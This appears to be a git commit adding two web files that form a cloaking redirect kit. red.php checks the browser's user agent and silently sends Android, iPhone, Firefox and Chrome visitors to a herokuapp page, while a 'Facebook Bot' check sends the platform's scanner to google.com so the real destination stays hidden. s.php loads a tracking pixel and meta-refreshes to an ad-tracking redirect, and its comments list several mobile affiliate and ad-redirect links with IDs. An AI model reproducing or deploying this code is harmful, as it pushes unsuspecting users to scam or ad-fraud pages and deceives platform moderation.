77083f9642b111fdb9aaa419fd63dacf9b43d68e
trackerscan12 <tracker.scan1@hotmail.com>
2016-10-12 20:05:19 +0200

    my first commit

---
+++ red.php
@@ -0,0 +1,30 @@
+ <script type="text/javascript"> // <![CDATA[
+if ( (navigator.userAgent.indexOf('Android') != -1) ) {
+document.location = "https://indexi123.herokuapp.com/s.php";
+} // ]]>
+</script>
+<script language=javascript>
+if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)))
+{
+location.replace("https://indexi123.herokuapp.com/s.php");
+}
+</script>                                               
+ <body>
+
+<script>
+
+if (navigator['userAgent']['indexOf']('Firefox') != -1) {
+    window['location'] = 'https://indexi123.herokuapp.com/s.php';
+} else {
+    if (navigator['userAgent']['indexOf']('Facebook Bot') != -1) {
+        window['location'] = 'http://google.com/';
+    } else {
+        if (navigator['userAgent']['indexOf']('Chrome') != -1) {
+            window['location'] = 'https://indexi123.herokuapp.com/';
+            } else {
+            window['location'] = 'https://indexi123.herokuapp.com/s.php';
+        };
+    };
+};
+</script>
+</body>
---
+++ s.php
@@ -0,0 +1,7 @@
+
+
+<script type="text/javascript">
+// http://mobile.bitterstrawberry.org/?id=5221  http://t0pm0b1l3.com/?id=5221  http://mobile.dollarlink.net/r/faif?aaid=341&aff_id=1380   //http://tracking.redirect.pub/ad/89f59368?d=1
+ new Image().src="http://whos.amung.us/widget/mobiditi2.png";  //http://global.dollarking.org/mobiledirect/?aaid=341 http://mobile.dollars4ads.com/directclick/?&odata=YWlkPTMxNzc0JnVpZD0xMzg4     //http://mobile.bitterstrawberry.org/?id=5221
+</script>
+<meta http-equiv="refresh" content="0;URL=http://tracking.redirect.pub/ad/89f59368?d=1">
